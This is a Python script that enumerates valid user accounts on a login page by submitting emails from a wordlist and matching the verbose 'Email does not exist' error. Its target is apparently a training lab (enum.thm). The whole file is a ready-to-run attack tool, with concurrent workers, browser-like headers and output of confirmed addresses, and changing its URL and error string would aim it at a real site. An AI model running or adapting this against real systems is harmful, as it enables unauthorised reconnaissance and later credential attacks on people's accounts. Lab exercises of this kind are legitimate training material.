from __future__ import annotations

import argparse
import sys
from concurrent.futures import ThreadPoolExecutor
from functools import partial
from pathlib import Path

import requests

"""Enumerate valid accounts via the verbose login error message."""

"""Usage: python3 script.py gmail.txt"""


LOGIN_URL = "http://enum.thm/labs/verbose_login/functions.php"
REFERER = "http://enum.thm/labs/verbose_login/"
ORIGIN = "http://enum.thm"

USER_AGENT = "Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0"

INVALID_MSG = "Email does not exist"


def build_session() -> requests.Session:
    """Create one session so TCP connections are reused across requests."""
    session = requests.Session()
    session.headers.update(
        {
            "User-Agent": USER_AGENT,
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "en-US,en;q=0.5",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": ORIGIN,
            "Referer": REFERER,
        }
    )
    return session


def check_email(session: requests.Session, email: str, timeout: float) -> bool | None:
    """Return True if the account exists, False if not, or None if the check failed."""
    data = {
        "username": email,
        "password": "password",
        "function": "login",
    }

    try:
        resp = session.post(LOGIN_URL, data=data, timeout=timeout)
        resp.raise_for_status()
        body = resp.json()

    except (requests.RequestException, ValueError) as exc:
        print(f"[ERROR] {email}: {exc}", file=sys.stderr)
        return None

    message = str(body.get("message", ""))
    is_invalid = body.get("status") == "error" and INVALID_MSG in message

    return not is_invalid


def load_emails(path: Path) -> list[str]:
    """Read non-empty, unique lines while preserving their original order."""
    with path.open(encoding="utf-8") as f:
        lines = (line.strip() for line in f)
        return list(dict.fromkeys(line for line in lines if line))


def enumerate_emails(emails: list[str], timeout: float, workers: int) -> list[str]:
    session = build_session()
    check = partial(check_email, session, timeout=timeout)
    valid: list[str] = []

    with ThreadPoolExecutor(max_workers=workers) as pool:
        for email, result in zip(emails, pool.map(check, emails)):
            if result is True:
                print(f"[VALID] {email}")
                valid.append(email)

            elif result is False:
                print(f"[INVALID] {email}")

    return valid


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Enumerate valid emails from a wordlist."
    )

    parser.add_argument("email_file", type=Path, help="file with one email per line")

    parser.add_argument(
        "-o", dest="output", type=Path, help="write valid emails to this file"
    )

    parser.add_argument(
        "-w",
        dest="workers",
        type=int,
        default=4,
        help="concurrent workers (default: 4)",
    )

    parser.add_argument(
        "-t", dest="timeout", type=float, default=5.0, help="request timeout in seconds"
    )

    args = parser.parse_args()

    if not args.email_file.is_file():
        print(f"File not found: {args.email_file}", file=sys.stderr)
        return 1

    emails = load_emails(args.email_file)

    valid = enumerate_emails(emails, timeout=args.timeout, workers=args.workers)

    print(f"\nValid emails found: {len(valid)}")

    for email in valid:
        print(email)

    if args.output:
        args.output.write_text(
            "\n".join(valid) + ("\n" if valid else ""), encoding="utf-8"
        )
        print(f"Saved to {args.output}")

    return 0


if __name__ == "__main__":
    sys.exit(main())
